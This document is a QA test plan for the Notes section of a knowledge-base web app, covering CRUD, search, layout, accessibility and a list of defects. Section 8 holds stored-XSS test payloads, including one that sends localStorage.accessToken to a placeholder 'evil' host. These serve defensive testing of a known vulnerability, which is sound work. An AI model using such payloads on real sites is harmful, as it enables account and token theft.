# 07 — Knowledge Base: Notes

| | |
|---|---|
| **Area code** | `NOTE` |
| **Routes** | `/knowledge` → tab **Notes** (default) |
| **Source** | `src/pages/knowledge/KnowledgePage.tsx`, `src/pages/knowledge/Notes/AddNoteForm.tsx`, `src/api/hooks/useFetchNotes.tsx`, `src/api/services/notes.service.tsx` |
| **APIs (knowledge-service)** | `GET /notes?page=&search=`, `POST /notes`, `PUT /notes/{id}`, `DELETE /notes/{id}` |
| **Query key** | `["notes", search]` (infinite), `staleTime` 5 min / `gcTime` 10 min |
| **Search debounce** | 500 ms |
| **Existing automation** | `cypress/e2e/08-KnowledgeBase.cy.jsx` (Notes describe block) |
| **See also** | doc 08 (Blogs share this page), doc 21 (dropdown/confirm modal), doc 26 (**note content is rendered with `dangerouslySetInnerHTML`** — highest-risk XSS surface in the app) |

### Entity (`KnowledgeNote`)

`title` (required) · `content` (markdown, required) · `tags: KnowledgeTag[]` (12 fixed values:
`algorithms`, `data-structures`, `javascript`, `python`, `system-design`, `behavioral`, `frontend`,
`backend`, `database`, `networking`, `security`, `architecture`) · `isPinned` · `isFavorite` ·
`createdAt` / `updatedAt`.

### Selector inventory

`knowledge-page`, `knowledge-search`, `knowledge-new-note-button`, `knowledge-tab-notes`,
`knowledge-tab-blogs`, `note-card`, `notes-empty`, `note-detail`, `note-actions-trigger`,
`note-edit-action`, `note-pin-action`, `note-favorite-action`, `note-delete-action`,
`note-form-modal`, `note-form-title`, `note-form-input-title`, `note-form-content`, `note-form-tag`
(+ `data-value`), `note-form-pinned`, `note-form-favorite`, `note-form-save`, `note-form-cancel`,
`note-form-close`, `confirmation-modal*`

### Global preconditions

- Logged in; `/knowledge` open on the Notes tab (default).
- Layout: left column = list + tag badges; right column (2/3 width) = selected-note detail.

---

## 1. Smoke (P0)

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-001 | P0 | Open `/knowledge` | `knowledge-page` renders on the Notes tab; `GET {KNOWLEDGE}/notes?page=1` issued `[auto: 08-KnowledgeBase]` |
| TC-NOTE-002 | P0 | Create a note with a title, content and one tag | `POST /notes`; toast `Note added successfully`; card appears in the list `[auto: 08]` |
| TC-NOTE-003 | P0 | Click the card | `note-detail` shows the title, tags, updated date and rendered content `[auto: 08]` |
| TC-NOTE-004 | P0 | Edit the note and save | `PUT /notes/{id}`; toast `Note updated successfully`; list card shows the new title `[auto: 08]` |
| TC-NOTE-005 | P0 | Pin and favourite the note from the actions menu | Two `PUT /notes/{id}` calls; pin/heart icons appear on the card `[auto: 08]` |
| TC-NOTE-006 | P0 | Delete the note and confirm | `DELETE /notes/{id}`; toast `Note deleted successfully`; card gone; detail pane returns to "Select a note" `[auto: 08]` |

## 2. Page shell & tabs

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-010 | P1 | Page header | h1 "Knowledge Base"; subtitle "Your personal notes and blog articles."; search box; "New Note" + "New Blog" buttons |
| TC-NOTE-011 | P1 | Tabs | Notes (default, selected) and Blogs |
| TC-NOTE-012 | P1 | Switch to Blogs and back | Notes list still rendered; no duplicate `GET /notes` within `staleTime` |
| TC-NOTE-013 | P2 | Type in the search box while on Notes | Tab stays on Notes (the input's `name` mirrors the active tab) |
| TC-NOTE-014 | P2 | Switch to Blogs, type in the search box, observe the tab | Tab stays on Blogs; the same search term feeds the blogs query — verify the shared search box is intentional ⚠ DEF-69 |
| TC-NOTE-015 | P2 | Reload the page while on Blogs | Returns to the Notes tab (tab not in the URL) ⚠ DEF-32 |
| TC-NOTE-016 | P2 | Click "New Blog" | The whole page is replaced by the blog form (not a modal) — see doc 08 |

## 3. Notes list

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-020 | P1 | Loading | Text "Loading notes…" in the left column (no skeleton cards) — cosmetic inconsistency with other modules ⚠ DEF-70 |
| TC-NOTE-021 | P1 | Empty account | `notes-empty` panel: "No notes found matching your search." — wording is wrong when no search is active ⚠ DEF-71 |
| TC-NOTE-022 | P1 | Card contents | Title (1-line clamp), pin icon when `isPinned`, heart icon when `isFavorite`, first 2 tag badges, `+N` badge when more, 2-line content preview ending in `...`, formatted `updatedAt` |
| TC-NOTE-023 | P1 | Content preview stripping | Markdown headings and fenced code blocks are removed from the preview; first 100 chars shown |
| TC-NOTE-024 | P2 | Note whose content is only a code fence | Preview is effectively empty followed by `...`; card still renders |
| TC-NOTE-025 | P1 | Selected card styling | Selected card has a primary ring; only one card selected at a time |
| TC-NOTE-026 | P1 | Tag badge colours | Each of the 12 tags maps to its colour class; a tag outside the map renders unstyled without a crash ⚠ DEF-72 |
| TC-NOTE-027 | P1 | Pinned notes ordering | Expected: pinned notes float to the top. No client-side sort exists — order is purely API order ⚠ DEF-73 |
| TC-NOTE-028 | P1 | All / Pinned / Favorites badges | Expected: they filter the list. They are decorative `Badge`s with no `onClick` — completely inert ⚠ DEF-74 |
| TC-NOTE-029 | P1 | Load More (account with > 1 page) | `GET /notes?page=2` appended; button hides when `totalLength` reached; label "Loading…" while fetching |
| TC-NOTE-030 | P2 | Stub `GET /notes` → `500` | Expected: an inline error state. The hook's error is not handled on this page, so the list renders as empty ⚠ DEF-75 |
| TC-NOTE-031 | P2 | Stub a note with `tags: null` | `note?.tags.slice` throws → blank tab. Expected: tolerate a missing array ⚠ DEF-76 |
| TC-NOTE-032 | P2 | 300-char title | Clamped to one line in the card; full title in the detail pane |
| TC-NOTE-033 | P2 | 50 notes loaded | List scrolls with the page; performance acceptable; no virtualisation (recorded) |

## 4. Search

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-040 | P1 | Type a title fragment | One `GET /notes?page=1&search=<term>` after 500 ms; list narrows |
| TC-NOTE-041 | P1 | Type 10 characters quickly | Exactly one request after the debounce |
| TC-NOTE-042 | P1 | Search a term matching nothing | `notes-empty` panel |
| TC-NOTE-043 | P1 | Clear the search | Request without `search`; full list restored |
| TC-NOTE-044 | P2 | Search by tag name (`javascript`) | Matches per the placeholder promise "notes, blogs, and tags" — otherwise raise a defect |
| TC-NOTE-045 | P2 | Search special characters (`&`, `%`, `#`, `+`) | Correctly encoded (`URLSearchParams`); no malformed request |
| TC-NOTE-046 | P2 | Search while a note is selected | Detail pane keeps showing the previously selected note even if it is filtered out of the list — verify the intended behaviour ⚠ DEF-77 |
| TC-NOTE-047 | P2 | Search with page 2 loaded | Query key changes → list resets to page 1 for the new term |
| TC-NOTE-048 | P2 | Search `<script>alert(1)</script>` | No execution; request encoded; empty result |

## 5. Create a note (`CRUD`)

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-060 | P1 | Click "New Note" | `note-form-modal` opens; `note-form-title` = "New Note"; empty fields; no tags selected; both checkboxes unchecked |
| TC-NOTE-061 | P0 | Save with empty title and content | Toast `Title and content are required`; **no** `POST` `[auto: 08]` |
| TC-NOTE-062 | P1 | Title only, save | Same toast; no request |
| TC-NOTE-063 | P1 | Content only, save | Same toast; no request |
| TC-NOTE-064 | P1 | Whitespace-only title/content | Same toast (values are `trim()`ed) |
| TC-NOTE-065 | P1 | Valid note with 2 tags, Pin + Favourite checked | `POST /notes` body `{title, content, tags:[…], isPinned:true, isFavorite:true}` (trimmed values); toast; modal closes; `["notes"]` invalidated `[auto: 08]` |
| TC-NOTE-066 | P1 | Toggle a tag button twice | Tag is added then removed; button switches between filled (`+` icon) and outline (`×` icon); selected badges row updates |
| TC-NOTE-067 | P1 | Select all 12 tags | All sent; badges wrap; modal remains scrollable |
| TC-NOTE-068 | P1 | While saving | Save button disabled with label "Saving…" |
| TC-NOTE-069 | P1 | Stub `POST /notes` → `500` | Toast `Failed to save note`; modal stays open with data intact |
| TC-NOTE-070 | P1 | Stub `POST /notes` → `401` | Token cleared; user redirected to login on next navigation; no phantom card |
| TC-NOTE-071 | P2 | Cancel / `X` / `Escape` / overlay click | Modal closes without saving; content discarded with no warning ⚠ DEF-39 |
| TC-NOTE-072 | P2 | Reopen after cancelling | Form is blank (state reset by the `open` effect) |
| TC-NOTE-073 | P2 | Double-click Save | Only one `POST` |
| TC-NOTE-074 | P2 | Markdown content (headings, lists, fenced code, table, link) | Saved verbatim; see §8 for how it renders |
| TC-NOTE-075 | P2 | 10 000-char content | Saved (or handled server error); textarea scrolls; modal scrolls (`max-h-[85vh]`) |
| TC-NOTE-076 | P2 | Unicode + emoji | Round-trip without mojibake |
| TC-NOTE-077 | P2 | Modal at 375 px | `w-[90vw] max-w-2xl`; tag buttons wrap; footer buttons reachable |

## 6. Edit a note (`CRUD`)

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-090 | P1 | Select a note → actions → "Edit Note" | Modal titled "Edit Note" pre-filled with title, content, tags and both flags `[auto: 08]` |
| TC-NOTE-091 | P1 | Change the title and save | `PUT /notes/{id}` with the full input object; toast `Note updated successfully`; **list card** shows the new title `[auto: 08]` |
| TC-NOTE-092 | P1 | Observe the detail pane after saving an edit | Expected: the detail pane shows the updated content immediately. `selectedNote` is not refreshed after the update, so the right pane keeps the pre-edit content until the card is clicked again ⚠ DEF-78 |
| TC-NOTE-093 | P1 | Clear the title and save | Validation toast; no request |
| TC-NOTE-094 | P1 | Remove all tags and save | `tags: []` sent; detail pane shows no badges after re-selection |
| TC-NOTE-095 | P1 | Toggle the Pin checkbox inside the edit form and save | `isPinned` updated; the card's pin icon reflects it |
| TC-NOTE-096 | P1 | Stub `PUT` → `500` | Toast `Failed to save note`; modal stays open |
| TC-NOTE-097 | P2 | Edit note A, cancel, open note B's edit form | B's data shown (effect keys on `noteData`/`open`) |
| TC-NOTE-098 | P2 | Click "New Note" right after editing | Blank form (the handler clears `selectedNote` and the editing flag) `[auto: 08]` |
| TC-NOTE-099 | P2 | Edit a note while a search filter is active | Update succeeds; the refetch may drop the card from the filtered list — the detail pane must not show a deleted/absent record |

## 7. Pin / Favourite / Delete from the actions menu

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-110 | P1 | Open the actions dropdown | Items: label "Actions", Edit Note, Pin/Unpin Note, Add to/Remove from Favorites, Delete Note (red) |
| TC-NOTE-111 | P1 | Click "Pin Note" | `PUT /notes/{id}` with `isPinned: true`; menu label flips to "Unpin Note"; card shows the pin icon `[auto: 08]` |
| TC-NOTE-112 | P1 | Click "Unpin Note" | `isPinned: false`; icon removed |
| TC-NOTE-113 | P1 | Click "Add to Favorites" | `isFavorite: true`; heart icon on the card; label flips to "Remove from Favorites" `[auto: 08]` |
| TC-NOTE-114 | P1 | Pin, then favourite | Both flags persist (each request carries the current values of the other) |
| TC-NOTE-115 | P1 | Stub the pin `PUT` → `500` | Expected: an error toast and no state change. Current handler has no `catch` → unhandled promise rejection, no user feedback ⚠ DEF-79 |
| TC-NOTE-116 | P1 | Click "Delete Note" | `confirmation-modal` with title "Delete Note" and message "Are you sure you want to delete this note?" `[auto: 08]` |
| TC-NOTE-117 | P0 | Confirm the delete | `DELETE /notes/{id}`; card removed; detail pane resets to the "Select a note" placeholder; toast `Note deleted successfully` `[auto: 08]` |
| TC-NOTE-118 | P1 | Cancel the delete | No request; note remains selected `[auto: 08]` |
| TC-NOTE-119 | P1 | Stub `DELETE` → `500` | Expected: an error toast and the note kept. Current handler has no `catch` → unhandled rejection, modal stays open, success toast never fires ⚠ DEF-80 |
| TC-NOTE-120 | P2 | Delete the only note | Empty state in the list; placeholder in the detail pane |
| TC-NOTE-121 | P2 | Keyboard: open the dropdown with `Enter`, navigate with ↓, activate with `Enter` | All four actions reachable; `Escape` closes and restores focus |
| TC-NOTE-122 | P2 | `Escape` on the delete confirmation | Expected: cancels ⚠ DEF-44 |

## 8. Content rendering & XSS (`SEC` — highest risk)

The detail pane injects note content with `dangerouslySetInnerHTML` after only four regex
replacements (`#`, `##`, `###`, newlines, triple-backtick fences). Everything else — including raw
HTML — is inserted verbatim.

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-130 | P1 | Note with `# H1`, `## H2`, `### H3` | Rendered as `<h1>/<h2>/<h3>` |
| TC-NOTE-131 | P1 | Note with newlines | Rendered as `<br>` |
| TC-NOTE-132 | P1 | Note with a fenced code block | Rendered inside `<pre><code>` |
| TC-NOTE-133 | P1 | Note with markdown lists / bold / links | **Not** converted (only headings and fences are handled) — raw markdown characters are visible ⚠ DEF-81 |
| TC-NOTE-134 | P0 | Note content `<img src=x onerror="alert(document.domain)">` then open the note | No script executes; the payload is displayed as text or stripped. Current implementation injects it into the DOM and the handler fires ⚠ **DEF-82 (P0 stored XSS)** |
| TC-NOTE-135 | P0 | Note content `<script>fetch('https://evil/?'+localStorage.accessToken)</script>` | No execution, no outbound request. (Inline `<script>` inserted via `innerHTML` does not execute, but this must be verified explicitly and documented.) |
| TC-NOTE-136 | P0 | Note content `<svg onload=alert(1)>` and `<iframe src="javascript:alert(1)">` | Neither executes |
| TC-NOTE-137 | P0 | Note content `<a href="javascript:alert(1)">click</a>` and click it | Link is inert/sanitised |
| TC-NOTE-138 | P1 | Note content `<style>body{display:none}</style>` | Page layout is not destroyed |
| TC-NOTE-139 | P1 | Note content `<form action="https://evil"><input name=x></form>` | No injected interactive form in the app UI |
| TC-NOTE-140 | P1 | Same payloads inside the **list preview** | Preview is React-escaped text (safe) — confirms the vulnerability is limited to the detail pane |
| TC-NOTE-141 | P1 | Same payloads in the note **title** | Escaped by React everywhere (card + detail) |
| TC-NOTE-142 | P2 | Fix verification (after sanitisation is added) | Payloads render as inert text; legitimate markdown still renders; add these six cases to the regression suite |

## 9. Layout, responsive & accessibility

| ID | P | Scenario / steps | Expected result |
|----|---|------------------|-----------------|
| TC-NOTE-150 | P1 | ≥ 768 px | 3-column grid: list 1/3, detail 2/3; both scroll with the page |
| TC-NOTE-151 | P1 | 375 px | Columns stack: list above, detail below; selecting a card scrolls/reveals the detail — verify the selection is discoverable on mobile ⚠ DEF-83 |
| TC-NOTE-152 | P2 | 1440 px+ | Detail pane content width remains readable; no stretched line lengths beyond the prose container |
| TC-NOTE-153 | P2 | Very long note (5 000 words) | Detail pane scrolls; the page does not gain a horizontal scrollbar; code blocks scroll internally |
| TC-NOTE-154 | P1 | axe scan (list, detail, modal) | No critical/serious violations |
| TC-NOTE-155 | P1 | Keyboard-only: create → select → edit → pin → delete | Fully completable. Note cards are `div`s with `onClick` and are not focusable ⚠ DEF-84 |
| TC-NOTE-156 | P2 | Screen reader on the detail pane | Title announced as a heading; content read in order; the `⋮` actions trigger has an accessible name ⚠ DEF-85 (currently a bare `⋮` glyph) |
| TC-NOTE-157 | P2 | Dark theme | Tag badges, card rings, prose (`dark:prose-invert`) and the modal all legible |
| TC-NOTE-158 | P2 | 200 % zoom | Two-column layout collapses gracefully; no overlap |

---

## Known defects surfaced by this module

| ID | Case | Summary |
|----|------|---------|
| DEF-69 | TC-NOTE-014 | One search box drives both tabs via the input's `name` attribute |
| DEF-70 | TC-NOTE-020 | Plain "Loading notes…" text instead of skeletons |
| DEF-71 | TC-NOTE-021 | Empty-state copy mentions a search even when none is active |
| DEF-72 | TC-NOTE-026 | Tag colour map has no fallback for unknown tags |
| DEF-73 | TC-NOTE-027 | Pinned notes are not surfaced/sorted |
| DEF-74 | TC-NOTE-028 | All/Pinned/Favorites badges are inert |
| DEF-75 | TC-NOTE-030 | Notes list has no error state |
| DEF-76 | TC-NOTE-031 | `note.tags.slice` crashes when `tags` is null |
| DEF-77 | TC-NOTE-046 | Selected note persists in the detail pane after being filtered out |
| DEF-78 | TC-NOTE-092 | Detail pane shows stale content after an edit |
| DEF-79 | TC-NOTE-115 | Pin/favourite failures are silent (no catch) |
| DEF-80 | TC-NOTE-119 | Delete failures are silent (no catch) |
| DEF-81 | TC-NOTE-133 | Only headings/fences are converted — lists, bold, links render as raw markdown |
| DEF-82 | TC-NOTE-134 | **P0 stored XSS** via `dangerouslySetInnerHTML` on note content |
| DEF-83 | TC-NOTE-151 | Mobile selection → detail transition is not discoverable |
| DEF-84 | TC-NOTE-155 | Note cards are not keyboard focusable |
| DEF-85 | TC-NOTE-156 | Actions trigger has no accessible name |

## Exit criteria

- Smoke green; full CRUD verified against the live backend.
- **DEF-82 fixed and TC-NOTE-134…137 passing** — release blocker.
- Silent-failure defects (DEF-79, DEF-80) resolved so users always get feedback.
- axe scan clean for list, detail and modal.
